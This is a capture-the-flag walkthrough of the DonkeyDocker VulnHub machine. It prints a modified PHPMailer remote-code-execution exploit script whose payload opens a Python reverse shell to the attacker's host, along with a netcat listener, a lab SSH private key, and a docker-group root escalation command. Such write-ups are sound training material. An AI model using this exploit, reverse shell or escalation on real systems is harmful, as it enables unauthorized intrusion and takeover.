---
layout: post
title:  "Donkey Docker: Vulnhub Walkthrough"
date:   2018-05-02 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine hosted on [VulnHub][1] that was created by [Dennis Herrmann][2] and is part of a series called `DonkeyDocker`. Its graded as intermediate but I rank it as intermediate to hard. As this is purely for educational purposes I'll throw in spoilers now... Syke read on. Word from the author:

```
This is my first boot2root - CTF VM. I hope you enjoy it. if you run into any issue
you can find me on Twitter: @dhn_ or feel free to write me a mail to:

Email: dhn@zer0-day.pw
GPG key: 0x2641123C
GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C
Level: I think the level of this boot2root challange is hard or intermediate.

Try harder!: If you are confused or frustrated don't forget that enumeration is the key!

Thanks: Special thanks to @1nternaut for the awesome CTF VM name!

Feedback: This is my first boot2root - CTF VM, please give me feedback on how to improve!

Tested: This VM was tested with:

VMware Workstation 12 Pro
VMware Workstation 12 Player
VMware vSphere Hypervisor (ESXi) 6.5
Networking: DHCP service: Enabled

IP address: Automatically assign
```
<!--more-->
## Information Gathering
We'll do an nmap scan:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries
|_/contact.php /index.php /about.php
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Docker Donkey
MAC Address: 00:0C:29:7E:4A:56 (VMware)
```
Only two ports are open. 22, 80. Port 22 is usually the lowest hanging fruit. We'll enumerate the webserver further.

__Port 80:__
We find the robots.txt has 3 disallowed entries.
```
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries
|_/contact.php /index.php /about.php
```
Using gobuster:
```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://192.168.175.133
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.109.149:80
[+] Threads:        30                                                          
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1                                              
[+] Show length:    true                                                        
[+] Extensions:     html,php                                                    
[+] Expanded:       true                                                        
[+] Timeout:        10s                                                         
===============================================================
2020/05/24 23:24:29 Starting gobuster                                           
===============================================================
http://192.168.109.149:80/.cvs.php (Status: 301) [Size: 316]
http://192.168.109.149:80/.config.php (Status: 301) [Size: 319]
...

```
This generates too many 301's (redirects) false positives. Let's modify the command. No extensions:
```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -u http://192.168.175.133

OR

$ dirb http://192.168.109.149 -r              
...

---- Scanning URL: http://192.168.109.149/ ----
+ http://192.168.109.149/about (CODE:200|SIZE:2098)
+ http://192.168.109.149/admin.php (CODE:301|SIZE:317)
==> DIRECTORY: http://192.168.109.149/assets/
+ http://192.168.109.149/backdoor (CODE:200|SIZE:15246)
+ http://192.168.109.149/contact (CODE:200|SIZE:3207)
==> DIRECTORY: http://192.168.109.149/css/
==> DIRECTORY: http://192.168.109.149/dist/
+ http://192.168.109.149/index (CODE:200|SIZE:4090)
+ http://192.168.109.149/index.php (CODE:301|SIZE:317)
+ http://192.168.109.149/info.php (CODE:301|SIZE:316)
==> DIRECTORY: http://192.168.109.149/mailer/
+ http://192.168.109.149/phpinfo.php (CODE:301|SIZE:319)
+ http://192.168.109.149/robots.txt (CODE:200|SIZE:79)
+ http://192.168.109.149/server-status (CODE:403|SIZE:303)
+ http://192.168.109.149/xmlrpc.php (CODE:301|SIZE:318)
+ http://192.168.109.149/xmlrpc_server.php (CODE:301|SIZE:325)
...

```
`http://192.168.109.149/mailer/` enumerate this further:
```
kali@marksmith:~/vulnhub/donkeydocker$ dirb http://192.168.109.149/mailer -r       

...

---- Scanning URL: http://192.168.109.149/mailer/ ----
+ http://192.168.109.149/mailer/admin.php (CODE:301|SIZE:324)
==> DIRECTORY: http://192.168.109.149/mailer/docs/
==> DIRECTORY: http://192.168.109.149/mailer/examples/
==> DIRECTORY: http://192.168.109.149/mailer/extras/
+ http://192.168.109.149/mailer/index.php (CODE:301|SIZE:324)
+ http://192.168.109.149/mailer/info.php (CODE:301|SIZE:323)
==> DIRECTORY: http://192.168.109.149/mailer/language/
+ http://192.168.109.149/mailer/LICENSE (CODE:200|SIZE:26421)
+ http://192.168.109.149/mailer/phpinfo.php (CODE:301|SIZE:326)
==> DIRECTORY: http://192.168.109.149/mailer/test/
+ http://192.168.109.149/mailer/xmlrpc.php (CODE:301|SIZE:325)
+ http://192.168.109.149/mailer/xmlrpc_server.php (CODE:301|SIZE:332)
...
```
Looks like we got phpmailer running on this server

![5-1.png](/assets/images/posts/donkeydocker-vulnhub-walkthrough/screenshot.png)

```
$ searchsploit phpmailer
----------------------------------------- ----------------------------------------
 Exploit Title                           |  Path
                                         | (/usr/share/exploitdb/)
----------------------------------------- ----------------------------------------
PHPMailer 1.7 - 'Data()' Remote Denial o | exploits/php/dos/25752.txt
PHPMailer < 5.2.18 - Remote Code Executi | exploits/php/webapps/40968.php
PHPMailer < 5.2.18 - Remote Code Executi | exploits/php/webapps/40970.php
PHPMailer < 5.2.18 - Remote Code Executi | exploits/php/webapps/40974.py
PHPMailer < 5.2.19 - Sendmail Argument I | exploits/multiple/webapps/41688.rb
PHPMailer < 5.2.20 - Remote Code Executi | exploits/php/webapps/40969.pl
PHPMailer < 5.2.20 / SwiftMailer < 5.4.5 | exploits/php/webapps/40986.py
PHPMailer < 5.2.20 with Exim MTA - Remot | exploits/php/webapps/42221.py
PHPMailer < 5.2.21 - Local File Disclosu | exploits/php/webapps/43056.py
WordPress PHPMailer 4.6 - Host Header Co | exploits/php/remote/42024.rb
----------------------------------------- ----------------------------------------
```
We'll use the exploit `40974.py` with a few modifications. Change the target to `http://192.168.109.149/contact`. When you try to run this. It requires some dependencies make sure they're installed. The exploit will look as follows:

___exploit.sh___
```
from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')
print("\n")

target = 'http://192.168.109.149/contact'
backdoor = '/backdoor.php'

payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.109.150\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @protonmail.com',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

proxies = {'http': 'localhost:8081', 'https':'localhost:8081'}


print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get('192.168.109.149/'+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
```
To get the reverse shell:
1. __Run the exploit `python exploit.sh`__
2. __Start a listener on the attacking box `nc -lnvp 4444`__
3. __Navigate to `http://192.168.109.149/backdoor.php`__

## Low-Privilege Shell
We get the Low Priv Shell
```
kali@marksmith:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.109.150] from (UNKNOWN) [192.168.109.149] 58344
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@12081bd067cc:/www$ ^Z
[1]+  Stopped                 nc -lnvp 4444
kali@marksmith:~$ stty raw -echo
kali@marksmith:~$ nc -lnvp 4444
www-data@12081bd067cc:/www$  export TERM=screen
```
Looking around we find `.htaccess`:
```
www-data@12081bd067cc:/www$ ls -alh
...
-rwxrwxrwx 1 root     root      259 Mar 24  2017 .htaccess
...
www-data@12081bd067cc:/www$ cat .htaccess
RewriteEngine On

# browser requests PHP
RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /([^\ ]+)\.php
RewriteRule ^/?(.*)\.php$ /$1 [L,R=301]

# check to see if the request is for a PHP file:
RewriteCond %{REQUEST_FILENAME}\.php -f
RewriteRule ^/?(.*)$ /$1.php [L]
```
This is responsible for all the redirects. Run LinEnum.sh we get these users:
```

[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
...
smith:x:1000:100::/home/smith:/bin/bash
```
We look in the root directory and find a file called main.sh  and as confirmed by LinEnum.sh we're inside docker environment.
```
www-data@12081bd067cc:/$ ls -alh
...
-rwxr-xr-x   1 root root    0 Mar 26  2017 .dockerenv
...
-rwxr-xr-x   1 root root  289 Mar 24  2017 main.sh
```
There's a flag in user /home/smith
```
www-data@12081bd067cc:/$ cat main.sh
#!/bin/bash

# change permission
chown smith:users /home/smith/flag.txt

# Start apache
source /etc/apache2/envvars
a2enmod rewrite
apachectl -f /etc/apache2/apache2.conf

sleep 3
tail -f /var/log/apache2/*&

# Start our fake smtp server
python -m smtpd -n -c DebuggingServer localhost:25
```
To login as user smith is a pure guess use `smith` as password.
```
www-data@12081bd067cc:/$ su - smith
Password:
smith@12081bd067cc:~$ ls
flag.txt
```
We get the flag
```
smith@12081bd067cc:~$ cat flag.txt
This is not the end, sorry dude. Look deeper!
I know nobody created a user into a docker
container but who cares? ;-)

But good work!
Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}

PS: I like 1984 written by George ORWELL
```
On this flag we get a hint he like George Orwell. Could this be a user. We navigate to the `.ssh` directory and check out the authorized_keys
```
smith@12081bd067cc:~$ ls -alh
total 28K
drwx------ 1 smith users 4.0K Mar 26  2017 .
drwxr-xr-x 1 root  root  4.0K Mar 26  2017 ..
-rw-r--r-- 1 smith users  220 Nov  5  2016 .bash_logout
-rw-r--r-- 1 smith users 3.5K Nov  5  2016 .bashrc
-rw-r--r-- 1 smith users  675 Nov  5  2016 .profile
drwx--S--- 2 smith users 4.0K Mar 22  2017 .ssh
-rw-r--r-- 1 smith users  237 Mar 22  2017 flag.txt
smith@12081bd067cc:~$ cat .ssh
cat: .ssh: Is a directory
smith@12081bd067cc:~$ cd .ssh/
smith@12081bd067cc:~/.ssh$ ls
authorized_keys  id_ed25519  id_ed25519.pub
smith@12081bd067cc:~/.ssh$ cat authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
smith@12081bd067cc:~/.ssh$ cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAhAQc3H36SyC4F6mO+/s+/wMLKL8/45ITnf9Hw47xKHwAAAJhsQyB3bEMg
dwAAAAtzc2gtZWQyNTUxOQAAACAhAQc3H36SyC4F6mO+/s+/wMLKL8/45ITnf9Hw47xKHw
AAAEAeyAfJp42y9KA/K5Q4M33OM5x3NDtKC2IljG4xT+orcCEBBzcffpLILgXqY77+z7/A
wsovz/jkhOd/0fDjvEofAAAAE29yd2VsbEBkb25rZXlkb2NrZXIBAg==
-----END OPENSSH PRIVATE KEY-----
smith@12081bd067cc:~/.ssh$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
smith@12081bd067cc:~/.ssh$
```
These look like the `ssh_keys` for user `orwell@donkeydocker`. Copy these on the attack-box. Then ssh as orwell.
```
kali@marksmith:~/vulnhub/donkeydocker$ cat ssh_key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAhAQc3H36SyC4F6mO+/s+/wMLKL8/45ITnf9Hw47xKHwAAAJhsQyB3bEMg
dwAAAAtzc2gtZWQyNTUxOQAAACAhAQc3H36SyC4F6mO+/s+/wMLKL8/45ITnf9Hw47xKHw
AAAEAeyAfJp42y9KA/K5Q4M33OM5x3NDtKC2IljG4xT+orcCEBBzcffpLILgXqY77+z7/A
wsovz/jkhOd/0fDjvEofAAAAE29yd2VsbEBkb25rZXlkb2NrZXIBAg==
-----END OPENSSH PRIVATE KEY-----

kali@marksmith:~/vulnhub/donkeydocker$ ssh orwell@192.168.109.149 -i ssh_key
Welcome to

  ___           _            ___          _
 |   \ ___ _ _ | |_____ _  _|   \ ___  __| |_____ _ _
 | |) / _ \ ' \| / / -_) || | |) / _ \/ _| / / -_) '_|
 |___/\___/_||_|_\_\___|\_, |___/\___/\__|_\_\___|_|
                        |__/
                             Made with <3 v.1.0 - 2017
...
donkeydocker:~$ ls
flag.txt
donkeydocker:~$ cat flag.txt
You tried harder! Good work ;-)

Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}

donkeydocker:~$ id
uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)
```
The user belongs to the docker group. Thus we can use this to priv esc the box
## Privilege Escalation
Having a look at `gtfobins` we find the following that may help with docker:
>docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Note: you gotta have internet access.
```
donkeydocker:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh               
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
cbdbe7a5bc2a: Pull complete
Digest: sha256:9a839e63dad54c3a6d1834e29692c8492d93f90c59c978c1ed79109ea4fb9a54
Status: Downloaded newer image for alpine:latest
/ # id               
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(w
heel),11(floppy),20(dialout),26(tape),27(video)  
```
## Afterthought

[1]: https://www.vulnhub.com/entry/donkeydocker-1,189/
[2]: https://twitter.com/@dhn_
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
